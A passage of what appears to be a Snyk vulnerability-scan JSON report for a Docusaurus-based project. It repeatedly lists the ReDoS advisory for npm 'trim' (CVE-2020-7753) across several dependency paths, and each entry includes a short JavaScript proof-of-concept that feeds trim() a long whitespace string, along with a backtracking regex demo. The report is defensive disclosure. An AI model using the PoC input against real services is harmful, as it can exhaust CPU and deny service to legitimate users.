possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
